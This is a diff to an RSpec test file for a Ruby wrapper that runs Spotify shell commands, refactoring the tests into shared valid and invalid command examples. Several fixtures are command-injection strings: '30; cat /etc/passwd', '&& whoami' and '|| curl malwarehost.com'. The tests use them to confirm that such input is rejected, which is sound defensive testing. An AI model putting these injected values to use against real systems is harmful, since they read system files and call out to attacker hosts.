@@ -6,46 +6,53 @@ require_relative "../app"
 require_relative "../spotify"
 
 describe "Spotify" do
-  let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands
+  shared_examples_for "a valid command" do
+    let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands
+
+    it "executes the correct Shpotify command" do
+      expect(Spotify).to receive(:`).with(expected_command).and_return(command_stub)
+      subject
+    end
+  end
+
+  shared_examples_for "an invalid command" do
+    it "does not call a system command" do
+      expect(Spotify).to_not receive(:`)
+      subject
+    end
+
+    it "calls invalid_command" do
+      expect(Spotify).to receive(:invalid_command)
+      subject
+    end
+  end
 
   describe ".stop" do
     subject { Spotify.stop }
+    let(:expected_command) { "./spotify.sh stop" }
 
-    it "stops Spotify" do
-      expect(Spotify).to receive(:`)
-        .with("./spotify.sh stop")
-        .and_return(command_stub)
-      subject
-    end
+    it_behaves_like "a valid command"
   end
 
   describe ".next" do
     subject { Spotify.next }
+    let(:expected_command) { "./spotify.sh next" }
 
-    it "advances to the next song" do
-      expect(Spotify).to receive(:`)
-        .with("./spotify.sh next")
-        .and_return(command_stub)
-      subject
-    end
+    it_behaves_like "a valid command"
   end
 
   describe ".prev" do
     subject { Spotify.prev }
+    let(:expected_command) { "./spotify.sh prev" }
 
-    it "replays the previous song" do
-      expect(Spotify).to receive(:`).with("./spotify.sh prev").and_return(command_stub)
-      subject
-    end
+    it_behaves_like "a valid command"
   end
 
   describe ".replay" do
     subject { Spotify.replay }
+    let(:expected_command) { "./spotify.sh replay" }
 
-    it "replays the current song" do
-      expect(Spotify).to receive(:`).with("./spotify.sh replay").and_return(command_stub)
-      subject
-    end
+    it_behaves_like "a valid command"
   end
 
   describe ".pos" do
@@ -53,174 +60,121 @@ describe "Spotify" do
 
     context "with an integer" do
       let(:time_in_seconds) { rand(0..100) }
-      it "changes the position of the song" do
-        expect(Spotify).to receive(:`).with("./spotify.sh pos #{time_in_seconds}")
-        subject
-      end
+      let(:expected_command) { "./spotify.sh pos #{time_in_seconds}" }
+
+      it_behaves_like "a valid command"
     end
 
-    context "with invalid input" do
-      let(:time_in_seconds) { "30; cat /etc/passwd" }
-      it "does nothing" do
-        expect(Spotify).to_not receive(:`)
-        subject
-      end
+    context "with missing time" do
+      let(:time_in_seconds) { nil }
+      it_behaves_like "an invalid command"
+    end
 
-      it "returns nil" do
-        expect(subject).to be_nil
-      end
+    context "when not a number" do
+      let(:time_in_seconds) { "some string" }
+      it_behaves_like "an invalid command"
     end
   end
 
   describe ".vol" do
     subject { Spotify.vol(vol_args) }
+    let(:expected_command) { "./spotify.sh vol #{vol_args}".rstrip }
 
     context "up" do
       let(:vol_args) { "up" }
 
-      it "increases the volume" do
-        expect(Spotify).to receive(:`).with("./spotify.sh vol up").and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "down" do
       let(:vol_args) { "down" }
 
-      it "decreases the volume" do
-        expect(Spotify).to receive(:`).with("./spotify.sh vol down").and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "with a volume integer" do
       let(:vol_args) { rand(0..100) }
-      it "changes the volume of the song" do
-        expect(Spotify).to receive(:`).with("./spotify.sh vol #{vol_args}")
-        subject
-      end
+
+      it_behaves_like "a valid command"
+    end
+
+    context "with missing vol" do
+      let(:vol_args) { nil }
+      it_behaves_like "an invalid command"
     end
 
     context "with invalid input" do
       let(:vol_args) { "30; cat /etc/passwd" }
-      it "does nothing" do
-        expect(Spotify).to_not receive(:`)
-        subject
-      end
-
-      it "returns nil" do
-        expect(subject).to be_nil
-      end
+      it_behaves_like "an invalid command"
     end
   end
 
   describe ".status" do
     subject { Spotify.status }
+    let(:expected_command) { "./spotify.sh status" }
 
-    it "returns that status of the song" do
-      expect(Spotify).to receive(:`).with("./spotify.sh status").and_return(command_stub)
-      subject
-    end
+    it_behaves_like "a valid command"
   end
 
   describe ".share" do
     subject { Spotify.share(share_args) }
+    let(:expected_command) { "./spotify.sh share #{share_args}".rstrip }
 
     context "empty string" do
       let(:share_args) { "" }
 
-      it "calls share with no args" do
-        expect(Spotify).to receive(:`).with("./spotify.sh share").and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "uri" do
       let(:share_args) { "uri" }
+      let(:expected_command) { "./spotify.sh share uri" }
 
-      it "advances to the next song" do
-        expect(Spotify).to receive(:`).with("./spotify.sh share uri").and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "url" do
       let(:share_args) { "url" }
+      let(:expected_command) { "./spotify.sh share url" }
 
-      it "advances to the next song" do
-        expect(Spotify).to receive(:`).with("./spotify.sh share url").and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
   end
 
   describe ".play" do
     subject { Spotify.play(play_args) }
+    let(:expected_command) { "./spotify.sh play #{play_args}" }
 
     context "search by artist" do
       let(:play_args) { "artist Trivium" }
-      it "searches by artist" do
-        expect(Spotify).to receive(:`)
-          .with("./spotify.sh play #{play_args}")
-          .and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "search by album" do
       let(:play_args) { "album In Waves" }
-      it "searches by album" do
-        expect(Spotify).to receive(:`)
-          .with("./spotify.sh play #{play_args}")
-          .and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "search by playlist" do
       let(:play_args) { "list this.is_my playlist" }
-      it "searches by playlist" do
-        expect(Spotify).to receive(:`)
-          .with("./spotify.sh play #{play_args}")
-          .and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "search by uri" do
       let(:play_args) { "uri spotify:track:4hk0OBunwz04gknkfNLzUn" }
-      it "searches by uri" do
-        expect(Spotify).to receive(:`)
-          .with("./spotify.sh play #{play_args}")
-          .and_return(command_stub)
-        subject
-      end
+      it_behaves_like "a valid command"
     end
 
     context "command injection" do
       let(:play_args) { "artist Trivium && whoami" }
 
-      it "does nothing" do
-        expect(Spotify).to_not receive(:`)
-        subject
-      end
-
-      it "returns nil" do
-        expect(subject).to be_nil
-      end
+      it_behaves_like "an invalid command"
     end
 
     context "command injection" do
       let(:play_args) { "list some_playlist || curl malwarehost.com" }
 
-      it "does nothing" do
-        expect(Spotify).to_not receive(:`)
-        subject
-      end
-
-      it "returns nil" do
-        expect(subject).to be_nil
-      end
+      it_behaves_like "an invalid command"
     end
   end
 end
